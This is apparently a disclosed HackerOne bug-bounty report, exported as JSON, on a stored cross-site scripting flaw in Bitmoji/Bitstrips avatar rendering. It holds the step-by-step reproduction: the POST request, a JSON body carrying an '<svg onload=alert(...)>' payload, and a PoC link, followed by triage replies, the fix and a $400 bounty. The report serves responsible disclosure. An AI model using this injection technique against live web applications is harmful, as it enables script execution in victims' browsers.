{"id":159878,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk4Nzg=","url":"https://hackerone.com/reports/159878","title":"[render.bitstrips.com] Stored XSS via an incorrect avatar property value","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-16T23:25:17.572Z","submitted_at":"2016-08-16T23:25:17.572Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"s_p_q_r","url":"/s_p_q_r","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":513,"url":"https://hackerone.com/snapchat","handle":"snapchat","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Snapchat","twitter_handle":"","website":"https://www.snapchat.com/","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-01-04T08:38:41.609Z","bug_reporter_agreed_on_going_public_at":"2016-12-05T08:38:33.756Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"While modifying an avatar, an attacker has the opportunity to submit XSS payloads as its property values. The resulting png file will return a 500 error with the payload in the response body. The response has a **text/html** content type, which makes the XSS attack possible.\n\n**PoC:**\n\n1. Go to https://www.bitmoji.com/account/ and create a new account\n2. Choose the avatar style and save it. The following POST request will be sent:\n\n\u003e POST /user/avatar?styles=1,4\u0026app_id=13 HTTP/1.1\n\u003e Host: api.bitmoji.com\n\u003e \n\u003e avatar_id=%id%\u0026char_data=%data%\n\n3\\. Modify the **data** value: set any **pd2** object property value (for example, **jaw**) to **\u003csvg onload=alert(document.domain)\u003e**:\n\n```\n{\"colours\":{},\"pd2\":{\"cranium\":\"cranium_midstraightmale\",\"forehead\":\"forehead_standard\",\"hair_back\":\"hair_back_midstraightmale\",\"hair_front\":\"hair_front_midstraightmale\",\"hairbottom\":\"hairbottom_blank\",\"detail_L2_L\":\"_blank\",\"detail_L2_R\":\"_blank\",\"jaw\":\"\u003csvg onload=alert(document.domain)\u003e\",\"beard\":\"_blank\",\"stachin\":\"_blank\",\"stachout\":\"_blank\"},\"body\":{},\"style\":1}\n```\n\nand submit the request again.\n\n4\\. Go to your account and click \"Edit yor avatar\". In your browser web console you will see a https://render.bitstrips.com/render/***/*.png link with a 500 error. Open this link.\n\nThe script will be executed.\n\nA PoC link: https://render.bitstrips.com/render/6688424/173752531_2_s1-v1.png\n\nI also recorded a video (see the attachment) of these steps, I hope it will help you reproduce the issue.\n\n\n","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":112661,"file_name":"bit_poc.wmv","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/112/661/c95b98c625a347d2913e7613d60dd5c3a38bee2d/bit_poc.wmv?response-content-disposition=attachment%3B%20filename%3D%22bit_poc.wmv%22%3B%20filename%2A%3DUTF-8%27%27bit_poc.wmv\u0026response-content-type=video%2Fx-ms-asf\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSZC7DXM7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134731Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQC%2BDPA%2BSA%2BpuJvH4UEzvWiP4UFbtskzj7xfN6rqlPo4hwIhAOElSqCIqXNISLvxjY33BSsqOOcMi8dDWLDb%2FHD9us3YKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwLzMOGCwg6RS74p74q1wP3%2BrYZeAM77Rmdm64%2BCSKI7bN93GsX7JZ2tRccS6J5LGMRJTs%2By2W6iZRVDq3XbBt0e6p3WHVjfBqyc9ME6wkTlY9d%2Fv3J1DB8BCqWSb%2BRKzvSiDC8qrGE542%2FrwTG4%2F%2F%2B2GZboS%2Bwx6a4S2dscyeGXoZ%2FpJf5Uq70DiwjHjChb4otA36pPHn6Cbuljknt8dm165HwajfM%2FYT9DsRnV1w0OsaZyXvEEhwGsPTVDhkOXnM85nNGqSZ3QDaL%2FFoqr9dtCpsUJbXrXwy5kt3x0oz1dJ01X%2BzIddVtQMPL2ptVZ7U9zvXOF0wODPRFZiOr31TkuvFOSwxvOXUum3Wvfo9vzLL2sp7049bpk2pDp0SX1ErSpZmBqjAE1Syh%2Bgl%2BQXOk5uGw1WkZ%2Bi%2BVM0miZCx%2Fzk0YwCnQVNh8OZjtqzLjisdsfijlbUNbtSb%2F2rqQk5byOsnNd8EOB%2Fk4YSlr9Ml9Z%2FBjM39hyAylCG6PZXUBPl4i%2FIRvue2kJRbtUIpgVYXpDngioq0oVUItMzpWv1Dpeb3i%2BGYq1GpN7Q2SSm%2FKrlHtq%2FAe%2FUyoxvBMaLL9j8sY6VSMaDAw3WBbjN8GeRsrk6lj%2FvPn7De7XtYE3zRUmOhj70LaDvgw%2FfCQiwY6pAEB7X%2FT8tdYZNLCr%2BSBWKV0iIWafrBI43qKIrIcnQBlJSwVNOZ8Gcvl0OoNDa0QYgNpFyVQok8yJDR3W7a4ZqF2ZSs2yTdzPkNqbsgUkg9RTuuVzr%2BJ0IWfPqfOclYjbyvg8xSLdadzgsszfk0wXK8O0D9utoO42Qj4fAyRHUrDx8JxY18uWRPyFpidRfVqDlD%2FMzGvphFE58fBjncDPhIagYIJNw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f985d706ae62d2ffa5a86561968e6a646e52985c37a11471d9f8c72fe738ee16","file_size":3983015,"type":"video/x-ms-asf"}],"allow_singular_disclosure_at":"2017-01-04T08:38:33.798Z","allow_singular_disclosure_after":-150440937.98627937,"singular_disclosure_allowed":true,"vote_count":21,"voters":["bogdantcaciuc","spam404","flashdisk","dmatrix","realtess","0nlymohammed","mpz","madrobot","harry_mg","eveeez","and 11 more..."],"structured_scope":{"databaseId":11820,"asset_type":"URL","asset_identifier":"www.bitstrips.com","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1132832,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thank you for your report.\n\nWhile this is interesting, it seems that this payload doesn't actually execute without user interaction, (you had to find the SVG and open it in a seperate window for the JavaScript to execute).  Can you demonstrate a way to perform a Cross-Site Scripting attack that does not require a user to do this?  Further, it seems that this attack is confined to your own account.  I'm not sure how you would be able to attack other users in this way.  Can you clarify how this attack could be used to attack other users?\n\nThanks, and good luck with your future bug hunting.","automated_response":false,"created_at":"2016-08-17T20:27:38.660Z","updated_at":"2016-08-17T20:27:38.660Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1132871,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello,\n\n\u003e While this is interesting, it seems that this payload doesn't actually execute without user interaction, (you had to find the SVG and open it in a seperate window for the JavaScript to execute).\n\nI don't understand quite well what you mean here. As an **attacker** I do have to find it, as shown in my PoC, and then send to the victim. The victim doesn't have to do anything else but just open it.\n\n\u003e Further, it seems that this attack is confined to your own account.\n\nNo, it is not. The link is available for everyone.\n\nÂ \nIn my report I provided a PoC link: https://render.bitstrips.com/render/6688424/173752531_2_s1-v1.png\n\nAfter a victim opens it, the script is executed without any user interaction. Did you try it?","automated_response":false,"created_at":"2016-08-17T20:45:20.323Z","updated_at":"2016-08-17T20:45:20.323Z","actor":{"username":"s_p_q_r","cleared":false,"url":"/s_p_q_r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1132995,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@s_p_q_r -- Ah OK, I understand now; sorry about that.  We are able to reproduce this behavior, and we'll be sure to reach out if we have further questions, as we continue to investigate.","automated_response":false,"created_at":"2016-08-17T21:29:18.034Z","updated_at":"2016-08-17T21:31:00.733Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1133133,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, I see, no problem. Thanks for taking a look!","automated_response":false,"created_at":"2016-08-17T22:22:54.219Z","updated_at":"2016-08-17T22:22:54.219Z","actor":{"username":"s_p_q_r","cleared":false,"url":"/s_p_q_r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1145907,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-08-22T20:54:51.444Z","updated_at":"2016-08-22T20:54:51.444Z","actor":{"username":"divya","cleared":false,"url":"/divya","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1222821,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @s_p_q_r \n\nYour PoC should no longer work. We are rolling out some more defenses around this. Please note that this domain does not have any authentication, which limits what you can do. We will leave this report open until all the changes land in production.\n\nCongratulations! The panel has decided to award you $400 for your bug report. We appreciate your efforts - thanks, and good luck on your future bug hunting!","automated_response":false,"created_at":"2016-09-29T00:20:39.578Z","updated_at":"2016-09-29T00:20:39.578Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Snapchat"}},"bounty_amount":"400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"snapchat","collaborator":{"username":"s_p_q_r","url":"/s_p_q_r"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1258444,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-10-20T18:08:00.077Z","updated_at":"2016-10-20T18:08:00.077Z","actor":{"username":"gdb","cleared":false,"url":"/gdb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"s_p_q_r","url":"/s_p_q_r"},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1276995,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nYep, looks fixed now.\n\nThanks for the bounty!","automated_response":false,"created_at":"2016-10-31T20:18:21.922Z","updated_at":"2016-10-31T20:18:21.922Z","actor":{"username":"s_p_q_r","cleared":false,"url":"/s_p_q_r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1340760,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-05T08:38:33.773Z","updated_at":"2016-12-05T08:38:33.773Z","first_to_agree":true,"actor":{"username":"s_p_q_r","cleared":false,"url":"/s_p_q_r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1398183,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-01-04T08:38:41.632Z","updated_at":"2017-01-04T08:38:41.632Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Snapchat"}},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9803879,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2020-11-12T16:25:16.691Z","updated_at":"2020-11-12T16:25:16.691Z","actor":{"username":"apfeifer_sc","cleared":false,"url":"/apfeifer_sc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"www.bitstrips.com","genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}